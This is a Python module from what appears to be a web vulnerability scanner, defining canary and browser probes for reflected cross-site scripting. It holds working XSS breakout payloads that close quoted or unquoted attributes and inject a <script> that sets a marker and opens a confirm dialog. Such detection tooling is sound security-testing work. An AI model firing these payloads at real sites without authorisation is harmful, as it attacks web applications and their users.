"""The probe grammar for reflected XSS, as data.

Two families, and the second one is why the probe shape is a *spec* rather than a
request:

**the canary** — one quiet request carrying a string full of the characters that
matter (`"`, `'`, `<`, `>`). It asks a narrow question: did our value come back,
and where did it land? The answer is a lead.

**the execution probes** — one per executable context, each with
``requires_context=(that_context,)`` and its own payload. They are emitted
unconditionally and *executed conditionally*: a browser run is the loudest thing
the engine owns, so it must never happen on a surface whose context nobody has
established. That is the "when" of the probe grammar doing real work rather than
decorating a spec.

Notice what is *not* here: no confirmation of what these probes find. Every spec
carries an oracle (a boolean question) and a declared evidence class, and the
confirmation of a candidate belongs to a verifier in a different class.
"""

from __future__ import annotations

from ...kernel.observation import (
    CONTEXT_DOUBLE_QUOTED_ATTRIBUTE,
    CONTEXT_RAW_HTML,
    CONTEXT_SINGLE_QUOTED_ATTRIBUTE,
    CONTEXT_UNQUOTED_ATTRIBUTE,
    SCRIPT_EXECUTABLE_CONTEXTS,
)
from ...kernel.technique import (
    KIND_BROWSER,
    KIND_HTTP,
    ORACLE_REFLECTION,
    ORACLE_SCRIPT_EXECUTION,
    PURPOSE_CONFIRM,
    Hypothesis,
    ProbeSpec,
)
from ..common import with_parameter

NAME = "xss_reflected"

#: The canary.  Every character in it is there for a reason: the word is a
#: distinctive *mark* (used to notice a target that transformed our bytes rather
#: than returning them), and the punctuation is what the observation layer needs
#: to place the reflection structurally.
CANARY = "ab1c2d3\"'<>"
MARK = "ab1c2d3"

#: The dialog text a payload opens.  Fixed, so the verifier can require that the
#: dialog it saw is *ours* rather than the page's own confirmation prompt — a
#: distinction a real target would make obvious and a test target would not.
DIALOG_TEXT = "vuln-engine-xss"

#: One payload per executable context.  Each one closes whatever encloses the
#: reflection and then opens a script.  Kept as a table so a new context is a row
#: rather than a new branch, and so the payload is reviewable next to the context
#: it claims to break out of.
_PAYLOAD_PREFIX: dict[str, str] = {
    CONTEXT_DOUBLE_QUOTED_ATTRIBUTE: '">',
    CONTEXT_SINGLE_QUOTED_ATTRIBUTE: "'>",
    CONTEXT_UNQUOTED_ATTRIBUTE: ">",
    CONTEXT_RAW_HTML: "",
}

#: Exported under its contract name so the Phase 3 synthesis grammar and the
#: stock payload builder share one table (the junction receives it as data;
#: it never imports this module).
BREAKOUT_PREFIX = _PAYLOAD_PREFIX


def script_body(hypothesis: Hypothesis, context: str) -> str:
    """The script a payload for *context* runs: marker assignment + dialog."""
    return f"<script>{marker_identifier(context)}=1;confirm('{DIALOG_TEXT}')</script>"


def _payload_prefix(hypothesis: Hypothesis, context: str) -> str:
    """The breakout prefix for *context* (the hypothesis is unused by this table)."""
    _ = hypothesis
    return _PAYLOAD_PREFIX.get(context, "")


def marker_identifier(context: str) -> str:
    """The JS global a payload for *context* sets when it runs.

    Deterministic from the context, so the spec, the payload and the verifier's
    marker expression cannot disagree about what to look for.
    """
    return f"__ve_xss_{context}"


def marker_name(context: str) -> str:
    """The name of the marker in an observation payload."""
    return f"{NAME}.{context}"


def marker_expression(context: str) -> str:
    """The expression the browser is asked; true only if the payload's JS ran."""
    return f"{marker_identifier(context)} === 1"


def payload_for(hypothesis: Hypothesis, context: str) -> str:
    """The payload that breaks out of *context* on *hypothesis*'s surface."""
    return f"{_payload_prefix(hypothesis, context)}{script_body(hypothesis, context)}"


def canary_spec(hypothesis: Hypothesis) -> ProbeSpec:
    """The one quiet request that establishes (or refutes) the hypothesis."""
    surface = hypothesis.surface
    return ProbeSpec(
        id=f"{NAME}:canary",
        kind=KIND_HTTP,
        host=surface.host,
        detail={
            "url": with_parameter(surface.url, surface.param, CANARY),
            "method": "GET",
        },
        oracle=ORACLE_REFLECTION,
        canary=CANARY,
        mark=MARK,
        # One request per surface, no browser: the cheapest thing this engine does.
        noise={
            "requests_per_surface": 1,
            "burstiness": 0.0,
            "fingerprint_distance": 0.0,
            "requires_browser": False,
        },
        produces="reflection",
    )


def execution_spec(hypothesis: Hypothesis, context: str) -> ProbeSpec:
    """The browser probe for one executable context — emitted, then gated."""
    surface = hypothesis.surface
    payload = payload_for(hypothesis, context)
    return ProbeSpec(
        id=f"{NAME}:exec:{context}",
        kind=KIND_BROWSER,
        host=surface.host,
        detail={
            "url": with_parameter(surface.url, surface.param, payload),
            "markers": {marker_name(context): marker_expression(context)},
        },
        oracle=ORACLE_SCRIPT_EXECUTION,
        # A confirmation, so the verifier runs it, not the driver: the technique
        # proposes, and its own proof would be a closed loop.
        purpose=PURPOSE_CONFIRM,
        # Declared, and it is the whole reason this probe is not run on spec.
        requires_context=(context,),
        noise={
            "requests_per_surface": 1,
            "burstiness": 0.0,
            "fingerprint_distance": 0.0,
            "requires_browser": True,
        },
        produces="execution",
        payload=payload,
    )


def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
    """Every probe for *hypothesis*: the canary, then one confirmation probe per
    executable context."""
    specs = [canary_spec(hypothesis)]
    for context in sorted(SCRIPT_EXECUTABLE_CONTEXTS):
        specs.append(execution_spec(hypothesis, context))
    return specs


def execution_spec_for(hypothesis: Hypothesis, context: str) -> ProbeSpec | None:
    """The execution probe matching *context*, or ``None`` when none exists."""
    if context not in SCRIPT_EXECUTABLE_CONTEXTS:
        return None
    return execution_spec(hypothesis, context)


__all__ = [
    "BREAKOUT_PREFIX",
    "CANARY",
    "DIALOG_TEXT",
    "MARK",
    "NAME",
    "canary_spec",
    "execution_spec",
    "execution_spec_for",
    "marker_expression",
    "marker_identifier",
    "marker_name",
    "payload_for",
    "probes",
]
